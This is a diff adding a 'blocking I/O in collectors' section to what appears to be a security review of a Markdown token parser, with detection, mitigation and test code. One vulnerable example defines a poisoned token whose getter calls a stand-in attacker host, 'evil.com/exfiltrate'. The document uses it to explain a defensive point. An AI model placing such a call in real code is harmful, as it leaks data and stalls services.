@@ -1023,6 +1023,175 @@ class Collector(Protocol):
 
 ---
 
+### Vulnerability 10: Blocking IO in Collectors / Token Accessors
+
+**Severity**: 🟠 HIGH (operational impact)
+
+**What happens**:
+Collectors or token getters perform **blocking I/O operations** (HTTP requests, database queries, file reads) inside `on_token()` callbacks. Since dispatch is **single-pass and synchronous**, one slow I/O blocks the entire parse, tying up worker threads and causing **queue accumulation**.
+
+**How triggered**:
+```python
+# VULNERABLE collector (blocks on HTTP)
+class LinksCollector:
+    def on_token(self, idx, token, ctx, wh):
+        if token.type == "link_open":
+            href = token.href
+
+            # ❌ Synchronous HTTP call blocks dispatch
+            try:
+                response = requests.get(href, timeout=5)
+                is_valid = response.status_code == 200
+            except Exception:
+                is_valid = False
+
+            self._links.append({"url": href, "valid": is_valid})
+
+# Or: poisoned token with blocking getter
+class MaliciousToken:
+    @property
+    def href(self):
+        # ❌ Blocks dispatch with network call
+        return requests.get("http://evil.com/exfiltrate").text
+```
+
+**Why worse than it looks**:
+- **Service unavailability**: One doc with blocking IO makes entire parsing service unresponsive
+- **Thread pool exhaustion**: All worker threads blocked waiting for I/O
+- **Cascading timeouts**: Upstream services timeout waiting for parse results
+- **Amplification attack**: Attacker crafts doc with hundreds of links → hundreds of blocking calls
+
+**Real-world scenarios**:
+1. **URL validation**: Collector checks if links are reachable by fetching them
+2. **Database lookups**: Collector queries DB to check if URL is blacklisted
+3. **File operations**: Collector reads large files synchronously during parse
+4. **External API calls**: Collector calls translation API for each heading
+
+**Detection**:
+```python
+# Profiling shows time spent in I/O syscalls
+import cProfile
+import pstats
+
+def profile_dispatch():
+    """Profile dispatch to detect blocking I/O."""
+    profiler = cProfile.Profile()
+    profiler.enable()
+
+    wh = TokenWarehouse(tokens, None)
+    wh.dispatch_all()
+
+    profiler.disable()
+    stats = pstats.Stats(profiler)
+
+    # Check for network/file I/O in hot path
+    for func_name in ['socket.', 'requests.', 'urllib.', 'open', 'read']:
+        if func_name in str(stats):
+            alert("blocking_io_detected", function=func_name)
+
+# Runtime metrics
+import time
+
+def monitor_dispatch_time():
+    """Alert on unexpectedly long dispatch times."""
+    start = time.perf_counter()
+    wh.dispatch_all()
+    elapsed = time.perf_counter() - start
+
+    # Dispatch should be fast (< 10ms for typical doc)
+    if elapsed > 0.1:  # 100ms threshold
+        alert("slow_dispatch", duration_ms=elapsed * 1000)
+```
+
+**Mitigation (immediate)**:
+```python
+# 1. NEVER do blocking I/O in on_token()
+class LinksCollector:
+    """Collect links for later validation (no I/O during dispatch)."""
+
+    def __init__(self):
+        self._links = []
+
+    def on_token(self, idx, token, ctx, wh):
+        if token.type == "link_open":
+            # ✅ Just collect - no I/O
+            self._links.append({"url": token.href})
+
+    def finalize(self, wh):
+        return {"links": self._links, "validation": "deferred"}
+
+# 2. Defer I/O to separate async worker
+async def validate_links_async(links):
+    """Validate links asynchronously after parsing."""
+    async with aiohttp.ClientSession() as session:
+        tasks = [validate_link(session, link["url"]) for link in links]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    return results
+
+# 3. Use timeouts around any unavoidable I/O
+from func_timeout import func_timeout, FunctionTimedOut
+
+def safe_getter_with_timeout(token, attr, timeout=0.1):
+    """Access token attribute with timeout."""
+    try:
+        # Wrap in timeout (100ms max)
+        value = func_timeout(timeout, lambda: getattr(token, attr, None))
+        return value
+    except FunctionTimedOut:
+        log_security_event("token_getter_timeout", attr=attr)
+        return None  # Fallback
+
+# 4. Document: collectors MUST be non-blocking
+class Collector(Protocol):
+    """Collector interface.
+
+    PERFORMANCE CONTRACT:
+    - on_token() MUST complete in < 1ms per token
+    - on_token() MUST NOT perform blocking I/O
+    - on_token() MUST NOT make network requests
+    - on_token() MUST NOT access databases
+    - on_token() MUST NOT read/write files
+
+    Defer expensive operations to finalize() or post-processing.
+    """
+    def on_token(self, idx, token, ctx, wh) -> None: ...
+```
+
+**Test**:
+```python
+def test_no_blocking_io_in_collectors():
+    """Verify collectors don't perform blocking I/O."""
+    import unittest.mock as mock
+
+    # Mock all blocking I/O functions to raise
+    with mock.patch('requests.get', side_effect=AssertionError("Blocking HTTP in collector!")):
+        with mock.patch('urllib.request.urlopen', side_effect=AssertionError("Blocking HTTP in collector!")):
+            with mock.patch('builtins.open', side_effect=AssertionError("Blocking file I/O in collector!")):
+
+                # Dispatch should not trigger any I/O
+                wh = TokenWarehouse(tokens, None)
+                wh.register_collector(LinksCollector())
+                wh.dispatch_all()  # Should not raise
+
+def test_dispatch_performance_threshold():
+    """Verify dispatch completes quickly (no blocking I/O)."""
+    import time
+
+    tokens = generate_test_tokens(1000)  # 1000 tokens
+
+    start = time.perf_counter()
+    wh = TokenWarehouse(tokens, None)
+    wh.register_collector(LinksCollector())
+    wh.dispatch_all()
+    elapsed = time.perf_counter() - start
+
+    # Should complete in < 10ms (1000 tokens @ <0.01ms each)
+    assert elapsed < 0.01, f"Dispatch too slow: {elapsed * 1000}ms (blocking I/O?)"
+```
+
+---
+
 ## Combined Attack Examples (Chains)
 
 ### Chain 1: Normalization + SSRF
